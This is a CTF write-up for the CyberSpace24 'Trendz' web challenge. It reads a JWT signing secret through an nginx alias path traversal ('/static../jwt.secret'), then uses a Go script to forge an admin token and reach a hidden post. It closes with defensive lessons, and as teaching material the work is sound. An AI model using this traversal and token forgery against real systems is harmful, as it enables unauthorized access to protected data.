---
title: "CyberSpace24 - Trendz"
date: 2024-09-02T11:51:43+01:00
tags: ["ctf", "write-up", "cyberspace"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Trendz"
summary: "To solve the \"Trendz\" CTF challenge, exploit JWT token validation and secret key exposure. By accessing the `/static` endpoint to retrieve the JWT secret, craft a valid token with the \"admin\" role to view the hidden post and obtain the flag."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "/images/default-cover.jpg" # default image path/url
    alt: "CTF Write-up Cover Image" # alt text
    caption: "CTF Write-up" # display caption under cover
    relative: false
    hidden: false
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Description

```
name: trendz
category: web exploitation
points: 383
solves: 52
```

The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.

> Note: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you've completed this initial task, and will be released in Wave 3.

> The JWT_SECRET_KEY environment variable given in the handout is just a placeholder, and not the actual value set on remote.


## Analysis

We're given the following web page (after we login)

![functionality](/blog/images/2024-09-02-11-15-54.png)

We can create posts and view them. Following what the description says, our job is to view
this hidden post, luckily for us, we're given the source code [here]()

```bash
.
├── Dockerfile
├── go.mod
├── go.sum
├── handlers
│   ├── custom
│   │   └── Custom.go
│   ├── dashboard
│   │   ├── AdminDash.go
│   │   ├── SuperAdminDash.go
│   │   └── UserDash.go
│   ├── db
│   │   └── Init.go
│   ├── jwt
│   │   └── JWTAuth.go
│   └── service
│       ├── CreateUser.go
│       ├── JWTHandler.go
│       ├── LoginUser.go
│       ├── Posts.go
│       └── ValidateAdmin.go
├── init.sql
├── jwt.secret
├── main.go
├── nginx.conf
├── readme.md
├── run.sh
├── static
│   ├── css
│   │   ├── admin.css
│   │   ├── bootstrap.min.css
│   │   ├── style.css
│   │   └── user.css
│   ├── index.html
│   └── js
│       ├── client-side-templates.js
│       ├── htmx.min.js
│       ├── json-enc.js
│       └── nunjucks.min.js
└── templates
    ├── adminDash.tmpl
    ├── login.tmpl
    ├── main.tmpl
    ├── register.tmpl
    ├── superAdminDash.tmpl
    ├── userDash.tmpl
    └── viewPost.tmpl
```

It's a Go application, let's check the Dockerfile

### `Dockerfile`

```Dockerfile
FROM golang:alpine AS builder
RUN apk update && apk add --no-cache git

WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download

COPY . .
ENV GIN_MODE=release
ENV PORT=8000
RUN go build -o /app/chall

FROM postgres:alpine
RUN apk update && apk add --no-cache nginx
COPY nginx.conf /etc/nginx/nginx.conf

COPY run.sh /usr/local/bin/run.sh
COPY init.sql /docker-entrypoint-initdb.d/init.sql
WORKDIR /app
COPY --from=builder /app/chall /app/chall
COPY static static
COPY templates templates

ENTRYPOINT ["sh", "/usr/local/bin/run.sh"]
```

This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.

The `run.sh` script is the entrypoint of the application. Let's check that:

### `run.sh`

```bash
#!/bin/env sh
cat /dev/urandom | head | sha1sum | cut -d " " -f 1 > /app/jwt.secret

export JWT_SECRET_KEY=notsosecurekey
export ADMIN_FLAG=CSCTF{flag1}
export POST_FLAG=CSCTF{flag2}
export SUPERADMIN_FLAG=CSCTF{flag3}
export REV_FLAG=CSCTF{flag4}
export POSTGRES_USER=postgres
export POSTGRES_PASSWORD=mysecretpassword
export POSTGRES_DB=devdb

uuid=$(cat /proc/sys/kernel/random/uuid)
user=$(cat /dev/urandom | head | md5sum | cut -d " " -f 1)
cat << EOF >> /docker-entrypoint-initdb.d/init.sql
	INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin');
    INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG');
EOF

docker-ensure-initdb.sh &
GIN_MODE=release /app/chall & sleep 5
su postgres -c "postgres -D /var/lib/postgresql/data" &

nginx -g 'daemon off;'
```

This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.

Since the actual challenge consists of 4 independent parts `(trend[number-of-z])`,
we can deduce based on the challenge name, that the flag we're looking for is `ADMIN_FLAG`.

Let's search in the codebase to see where this flag is mentioned.

> Note: you can check the source code of the application alone, since the code base is a bit
bigger than what a writeup could handle, I'll entrust the process of understanding the api to you.

Searching for the keyword, we get one occurrence in `handlers/dashboard/AdminDash.go`, more specifically
in the `AdminDashboard` function that looks like this:

```go
func AdminDashboard(ctx *gin.Context) {
	posts := service.GetAllPosts()
	ctx.HTML(200, "adminDash.tmpl", gin.H{
		"flag":  os.Getenv("ADMIN_FLAG"),
		"posts": posts,
	})
}
```

If we are admin, we can view all the posts, among which is the desired post which contains the flag.

However, we have a problem, we're mere `users`, how can we change our role to `admin`.

> The application uses JWT tokens for access control. It uses accessToken only to validate
admins.

---

Let's dive deeper into the codebase, where is the `AdminDashboard` mentioned again?


![admin-dashboard-in-codebase](/blog/images/2024-09-02-12-15-11.png)

One occurence in the `main.go` script under the `admin` group. To access the admin dashboard, we first
have to validate the access token, then we have to validate the admin. Let's check the code for both:

### `JWTAuth.go`

```go
func ValidateAccessToken(encodedToken string) (*jwt.Token, error) {
	return jwt.Parse(encodedToken, func(token *jwt.Token) (interface{}, error) {
		_, isValid := token.Method.(*jwt.SigningMethodHMAC)
		if !isValid {
			return nil, fmt.Errorf("invalid token with signing method: %v", token.Header["alg"])
		}
		return []byte(secretKey), nil
	})
}
```

This Go function validates a JWT by parsing it and checking the signing method. It ensures the token uses HMAC signing and verifies it with a secret key. If the signing method is incorrect, it returns an error.

The secret key is found in the `jwt.secret` a the root of the application. Seeems we needs to retrieve that hmmm...

Okay, Let's check the admin validation code:

### `ValidateAdmin.go`

```go
func ValidateAdmin() gin.HandlerFunc {
	return func(c *gin.Context) {
		const bearerSchema = "Bearer "
		var tokenDetected bool = false
		var tokenString string
		authHeader := c.GetHeader("Authorization")
		if len(authHeader) != 0 {
			tokenDetected = true
			tokenString = authHeader[len(bearerSchema):]
		}
		if !tokenDetected {
			var err error
			tokenString, err = c.Cookie("accesstoken")
			if tokenString == "" || err != nil {
				c.Redirect(302, "/getAccessToken?redirect="+c.Request.URL.Path)
			}
		}
		fmt.Println(tokenString)
		claims := jwt.ExtractClaims(tokenString)
		if claims["role"] == "admin" || claims["role"] == "superadmin" {
			fmt.Println(claims)
		} else {
			fmt.Println("Token is not valid")
			c.AbortWithStatusJSON(403, gin.H{"error": "User Unauthorized"})
			return
		}
	}
}
```

This Go function is a Gin middleware that checks if the request has a valid JWT token with an "admin" or "superadmin" role. It first looks for the token in the "Authorization" header or a cookie. If not found or invalid, it redirects the user to obtain an access token or returns a 403 Unauthorized error.

Interesting, if we can craft our own valid JWT token, with role `admin` (or `superadmin`, but that's for another challenge),
we can access the admin dashboard, from which we can retrieve the hidden post that has the flag.


## Exploitation

You should note, that without the `jwt.secret` contents, we can't do anything.

We are not given a custom nginx configuration for nothing though, if we check the config

```bash
user  nobody;
worker_processes  auto;

events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
        location / {
            proxy_pass http://localhost:8000;
        }
        location /static {
            alias /app/static/;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }

    }

}
```

We can see that `/static` is aliased to `/app/static/`, with no restriction for
which files we can access (including jwt.secret), thus enabling us to navigate to `/static../jwt.secret`,
which is aliased to `/app/static/../jwt.secret`, that is the secret key used to sign the JWT token.

Great! we got the key. Now let's craft our valid JWT token using the following script

```go
package main

import (
    "fmt"
    "os"
    "time"

    "github.com/golang-jwt/jwt/v5"
)

var secretKey = []byte{}

func InitJWT() {
    key, err := os.ReadFile("jwt.secret")
    if err != nil {
        panic(err)
    }
    secretKey = key[:]
}

func GenerateAccessToken(username string, role string) (string, error) {
    token := jwt.NewWithClaims(jwt.SigningMethodHS256,
        jwt.MapClaims{
            "username": username,
            "exp":      time.Now().Add(time.Minute * 10).Unix(),
            "role":     role,
            "iat":      time.Now().Unix(),
        })

    signedToken, err := token.SignedString(secretKey)
    if err != nil {
        signedToken = ""
    }
    return signedToken, err
}

func main() {
    InitJWT()
    token, err := GenerateAccessToken("hxuu", "admin")
    if err != nil {
        fmt.Println("Error generating token:", err)
        return
    }
    fmt.Println("Generated Token:", token)
}
```

> jwt.secret is the file we downloaded previously.

Running the script gives us a valid JWT Token.

![generated-token](/blog/images/2024-09-02-12-39-26.png)

Now we just have to login as user `hxuu`, replace the `accesstoken` in the cookies with our
token, and access `/admin/dashboard`.

![got-to-dashboard](/blog/images/2024-09-02-12-41-09.png)

Awesome, we can see the wanted post id. Let's access it using `/user/posts/<id>`


![flag](/blog/images/2024-09-02-12-42-45.png)

And there we go~ Flag is: `CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}`

---

Lessons learned from this challenge:

- **JWT Secret Key Exposure**: Ensuring sensitive files like JWT secrets are not publicly accessible is crucial to prevent unauthorized access.
- **Token Crafting**: Crafting a valid JWT token can allow you to bypass access controls if the secret key is known.
- **Nginx Configuration**: Be aware of Nginx configurations that could expose sensitive files through aliases or improper restrictions.
- **Access Control**: Properly validate and handle user roles and permissions to secure admin and sensitive functionalities.
